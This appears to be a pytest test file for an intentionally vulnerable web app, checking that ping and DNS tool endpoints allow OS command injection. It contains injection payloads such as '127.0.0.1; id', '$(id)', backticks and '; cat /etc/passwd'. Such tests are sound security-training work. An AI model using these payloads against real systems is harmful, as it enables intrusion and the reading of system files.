"""
V07 - Command Injection Tests

This vulnerability allows attackers to execute arbitrary
OS commands via unsanitized input to system utilities.
"""

import pytest


class TestCommandInjection:
    """Tests for V07 - Command Injection."""

    @pytest.mark.asyncio
    async def test_basic_command_injection(self, client, user_token):
        """V07: Basic command injection with semicolon."""
        headers = {"Authorization": f"Bearer {user_token}"}

        # Inject 'id' command after legitimate host
        response = await client.post(
            "/api/tools/ping",
            json={"host": "127.0.0.1; id"},
            headers=headers
        )

        if response.status_code == 200:
            text = response.text.lower()
            # VULNERABILITY: Command output visible
            cmd_indicators = ["uid=", "gid=", "groups="]
            found = any(indicator in text for indicator in cmd_indicators)
            assert found, "Expected command execution output"

    @pytest.mark.asyncio
    async def test_pipe_command_injection(self, client, user_token):
        """V07: Command injection via pipe."""
        headers = {"Authorization": f"Bearer {user_token}"}

        response = await client.post(
            "/api/tools/ping",
            json={"host": "127.0.0.1 | whoami"},
            headers=headers
        )

        if response.status_code == 200:
            text = response.text.lower()
            # Check for username in output
            user_indicators = ["root", "www-data", "nobody", "user", "daemon"]
            found = any(indicator in text for indicator in user_indicators)
            # Note: might not find if running as unusual user
            assert response.status_code == 200

    @pytest.mark.asyncio
    async def test_backtick_command_injection(self, client, user_token):
        """V07: Command injection via backticks."""
        headers = {"Authorization": f"Bearer {user_token}"}

        response = await client.post(
            "/api/tools/ping",
            json={"host": "`id`"},
            headers=headers
        )

        # VULNERABILITY: Backtick command substitution
        assert response.status_code in [200, 500]

    @pytest.mark.asyncio
    async def test_dollar_command_injection(self, client, user_token):
        """V07: Command injection via $()."""
        headers = {"Authorization": f"Bearer {user_token}"}

        response = await client.post(
            "/api/tools/ping",
            json={"host": "$(id)"},
            headers=headers
        )

        # VULNERABILITY: $() command substitution
        assert response.status_code in [200, 500]

    @pytest.mark.asyncio
    async def test_file_read_via_cmdi(self, client, user_token):
        """V07: Read files via command injection."""
        headers = {"Authorization": f"Bearer {user_token}"}

        response = await client.post(
            "/api/tools/ping",
            json={"host": "127.0.0.1; cat /etc/passwd"},
            headers=headers
        )

        if response.status_code == 200:
            text = response.text
            # VULNERABILITY: File contents visible
            if "root:" in text or "/bin/bash" in text:
                assert True, "/etc/passwd contents leaked"
            else:
                # Command injection still works even if file not readable
                assert "uid=" in text.lower() or response.status_code == 200

    @pytest.mark.asyncio
    async def test_newline_command_injection(self, client, user_token):
        """V07: Command injection via newline."""
        headers = {"Authorization": f"Bearer {user_token}"}

        response = await client.post(
            "/api/tools/ping",
            json={"host": "127.0.0.1\nid"},
            headers=headers
        )

        # Newline might execute second command
        assert response.status_code in [200, 500]

    @pytest.mark.asyncio
    async def test_dns_endpoint_cmdi(self, client, user_token):
        """V07: Command injection on DNS lookup endpoint."""
        headers = {"Authorization": f"Bearer {user_token}"}

        # Try DNS endpoint if it exists
        response = await client.post(
            "/api/tools/dns",
            json={"domain": "example.com; id"},
            headers=headers
        )

        # Endpoint might not exist (404) or be vulnerable
        assert response.status_code in [200, 404, 500, 422]
